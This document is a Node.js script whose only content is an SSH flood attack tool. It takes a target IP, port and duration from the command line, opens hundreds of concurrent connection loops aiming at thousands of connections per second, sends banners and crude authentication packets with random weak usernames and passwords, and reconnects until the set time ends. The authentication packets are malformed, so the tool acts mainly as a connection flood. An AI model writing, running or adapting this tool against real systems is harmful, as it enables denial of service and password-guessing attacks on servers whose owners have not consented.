const net = require('net');
const crypto = require('crypto');

// Configuration - Edit these values before running
const CONFIG = {
  TARGET_IP: process.argv[2] || '127.0.0.1',      // Target IP address
  TARGET_PORT: parseInt(process.argv[3]) || 22,   // SSH port (default: 22)
  DURATION: parseInt(process.argv[4]) || 60,      // Attack duration in seconds
  THREADS: 500,                                   // Number of concurrent threads
  REQUESTS_PER_SECOND: 10000,                      // Total requests per second
  DEBUG: false                                    // Show debug messages
};

// Global statistics
const stats = {
  attempts: 0,
  connections: 0,
  errors: 0,
  startTime: Date.now()
};

// Common SSH usernames and passwords
const USERNAMES = ['root', 'admin', 'user', 'test', 'ubuntu', 'debian', 'centos', 'oracle'];
const PASSWORDS = ['password', '123456', 'admin', 'root', 'test', 'qwerty', 'welcome', 'login'];

// Generate random credentials
function generateCreds() {
  return {
    username: USERNAMES[Math.floor(Math.random() * USERNAMES.length)] + 
              crypto.randomBytes(2).toString('hex'),
    password: PASSWORDS[Math.floor(Math.random() * PASSWORDS.length)] + 
              crypto.randomBytes(2).toString('hex')
  };
}

// Create and manage SSH connection
function createConnection() {
  const creds = generateCreds();
  const client = new net.Socket();
  
  // Connection timeout
  client.setTimeout(5000);
  
  client.connect(CONFIG.TARGET_PORT, CONFIG.TARGET_IP, () => {
    stats.connections++;
    
    // SSH protocol version exchange
    client.write('SSH-2.0-OpenSSH_8.4p1 Ubuntu-5\r\n');
    
    // Send authentication attempt after short delay
    setTimeout(() => {
      try {
        // SSH userauth request with random credentials
        const payload = Buffer.concat([
          Buffer.from([0x00, 0x00, 0x00, 0x14]), // Length
          Buffer.from([0x06]),                    // SSH_MSG_USERAUTH_REQUEST
          Buffer.from(creds.username + '\x00'),   // Username
          Buffer.from('ssh-connection\x00'),      // Service name
          Buffer.from('password\x00\x00\x00'),    // Method
          Buffer.from(creds.password)             // Password
        ]);
        
        client.write(payload);
        stats.attempts++;
        
        // Keep connection alive
        const keepAlive = setInterval(() => {
          if (client.writable) {
            client.write(Buffer.from([0x00, 0x00, 0x00, 0x0C, 0x06, 0x01]));
          }
        }, 30000);
        
        client.on('close', () => clearInterval(keepAlive));
        
      } catch (e) {
        stats.errors++;
        client.destroy();
      }
    }, 50);
  });

  // Error handling
  client.on('error', (err) => {
    if (CONFIG.DEBUG) console.error('Connection error:', err.message);
    stats.errors++;
    client.destroy();
  });

  client.on('timeout', () => {
    client.destroy();
  });

  client.on('close', () => {
    // Reconnect if still within attack duration
    if ((Date.now() - stats.startTime) < CONFIG.DURATION * 1000) {
      setTimeout(createConnection, 100);
    }
  });
}

// Start the flood
function startFlood() {
  console.log(`\n\x1b[31m[!] Starting SSH flood against ${CONFIG.TARGET_IP}:${CONFIG.TARGET_PORT}\x1b[0m`);
  console.log(`\x1b[33m[!] Duration: ${CONFIG.DURATION} seconds | Rate: ${CONFIG.REQUESTS_PER_SECOND} req/s\x1b[0m`);
  
  // Calculate requests per thread
  const requestsPerThread = Math.ceil(CONFIG.REQUESTS_PER_SECOND / CONFIG.THREADS);
  
  // Start all threads
  for (let i = 0; i < CONFIG.THREADS; i++) {
    // Stagger thread startup
    setTimeout(() => {
      // Each thread creates connections at its designated rate
      const interval = setInterval(() => {
        if ((Date.now() - stats.startTime) < CONFIG.DURATION * 1000) {
          createConnection();
        } else {
          clearInterval(interval);
        }
      }, 1000 / requestsPerThread);
    }, i * 50);
  }
  
  // Display stats
  const statsInterval = setInterval(() => {
    process.stdout.write('\r\x1b[K');
    process.stdout.write(
      `\x1b[32m[+] Attempts: ${stats.attempts} | ` +
      `\x1b[34mConnections: ${stats.connections} | ` +
      `\x1b[31mErrors: ${stats.errors}\x1b[0m`
    );
    
    // Check if attack duration has elapsed
    if ((Date.now() - stats.startTime) >= CONFIG.DURATION * 1000) {
      clearInterval(statsInterval);
      console.log('\n\n\x1b[33m[!] Attack completed\x1b[0m');
      console.log(`\x1b[36m[+] Final stats - Attempts: ${stats.attempts} | Connections: ${stats.connections} | Errors: ${stats.errors}\x1b[0m`);
      process.exit();
    }
  }, 500);
}

// Handle Ctrl+C
process.on('SIGINT', () => {
  console.log('\n\x1b[33m[!] Stopping flood...\x1b[0m');
  console.log(`\x1b[36m[+] Final stats - Attempts: ${stats.attempts} | Connections: ${stats.connections} | Errors: ${stats.errors}\x1b[0m`);
  process.exit();
});

// Start the attack
startFlood();
